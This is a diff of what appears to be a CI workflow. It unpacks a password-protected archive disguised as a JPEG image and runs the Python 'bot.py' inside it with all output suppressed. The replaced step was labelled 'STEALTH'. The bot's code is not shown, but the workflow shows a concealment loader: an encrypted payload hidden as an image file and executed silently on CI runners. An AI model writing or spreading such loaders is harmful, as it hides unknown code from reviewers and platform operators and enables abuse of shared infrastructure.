@@ -43,17 +43,13 @@ jobs:
           Rename-Item p.jpg p.7z
           & "C:\Program Files\7-Zip\7z.exe" x p.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null
 
-      - name: Run worker (OPSI 2 – STEALTH)
+      - name: Run worker (bot.py only)
         shell: powershell
         run: |
           $ErrorActionPreference = 'SilentlyContinue'
 
-          # ambil semua file .py di extracted
-          $files = Get-ChildItem extracted -File -Filter *.py
+          $botPath = "extracted\bot.py"
 
-          # guard: hanya jalan jika TEPAT 1 file .py
-          if ($files.Count -ne 1) { exit 0 }
+          if (-Not (Test-Path $botPath)) { exit 0 }
 
-          $py = $files[0]
-
-          cmd /c "python `"$($py.FullName)`" > nul 2>&1"
+          cmd /c "python `"$botPath`" > nul 2>&1"
